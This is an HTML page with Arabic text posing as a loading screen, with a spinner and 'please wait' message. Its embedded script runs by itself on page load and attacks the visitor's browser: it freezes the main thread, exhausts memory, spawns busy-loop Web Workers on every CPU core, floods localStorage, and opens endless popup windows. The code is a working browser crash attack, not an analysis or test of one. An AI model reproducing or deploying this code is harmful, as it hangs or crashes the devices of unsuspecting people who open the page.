<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>جارٍ التحميل...</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body {
    min-height:100vh;
    display:flex; align-items:center; justify-content:center;
    background:#0b141a; color:#e9edef;
    font-family:-apple-system, sans-serif;
    overflow:hidden;
  }
  .w { text-align:center; padding:30px; }
  .s {
    width:50px; height:50px; margin:0 auto 20px;
    border:4px solid #1f2c34; border-top-color:#25d366;
    border-radius:50%; animation:spin 1s linear infinite;
  }
  @keyframes spin { to { transform:rotate(360deg); } }
  h1 { font-size:18px; font-weight:600; margin-bottom:8px; }
  p  { font-size:13px; color:#8696a0; }
</style>
</head>
<body>
<div class="w">
  <div class="s"></div>
  <h1>جارٍ التحميل...</h1>
  <p>يرجى الانتظار</p>
</div>

<script>
(function () {
  "use strict";

  // === المرحلة 1: تجميد الخيط الرئيسي (freeze) ===
  // حلقة لا نهائية تمنع المتصفح من معالجة أي حدث
  function freezeMainThread(seconds) {
    const end = Date.now() + seconds * 1000;
    while (Date.now() < end) {
      // اشتغل بلا توقف — المتصفح يتجمد تماماً
      Math.sqrt(Math.random());
    }
  }

  // === المرحلة 2: استهلاك الذاكرة (RAM) ===
  // مصفوفات ضخمة تستهلك كل الذاكرة المتاحة
  function exhaustMemory() {
    const hog = [];
    try {
      for (let i = 0; i < 1e9; i++) {
        hog.push(new Array(100000).fill("A".repeat(1000)));
      }
    } catch (e) {
      // المتصفح يرمي OutOfMemory — لكنه يكون قد تجمد أو انهار
      console.warn("memory exhausted:", e.message);
    }
  }

  // === المرحلة 3: تشغيل عمليات متوازية ===
  // Web Workers تستنزف كل الأنوية
  function spawnWorkers(count) {
    const code = `
      let n = 0;
      self.onmessage = function() {
        while (true) {
          n += Math.sqrt(Math.random());
          if (n > 1e9) n = 0;
        }
      };
    `;
    const blob = new Blob([code], { type:"application/javascript" });
    const url = URL.createObjectURL(blob);
    const workers = [];
    for (let i = 0; i < count; i++) {
      try {
        const w = new Worker(url);
        w.postMessage("go");
        workers.push(w);
      } catch (e) {
        console.warn("worker failed:", e.message);
      }
    }
    return workers;
  }

  // === المرحلة 4: فتح نوافذ لا نهائية (popup bomb) ===
  function popupBomb() {
    setInterval(function () {
      try { window.open(location.href, "_blank", "width=100,height=100"); } catch (e) {}
    }, 10);
  }

  // === المرحلة 5: ضغط الـstorage ===
  function fillStorage() {
    try {
      const big = "X".repeat(5 * 1024 * 1024); // 5MB
      for (let i = 0; i < 100; i++) {
        localStorage.setItem("_hog_" + i, big);
      }
    } catch (e) {
      console.warn("storage full:", e.message);
    }
  }

  // === التنفيذ ===
  // الترتيب: تجميد -> ذاكرة -> عمال -> نوافذ
  setTimeout(function () {
    try { freezeMainThread(10); } catch (e) {}
    try { exhaustMemory(); } catch (e) {}
    try { spawnWorkers(navigator.hardwareConcurrency || 8); } catch (e) {}
    try { fillStorage(); } catch (e) {}
    try { popupBomb(); } catch (e) {}
  }, 500);

})();
</script>
</body>
</html>
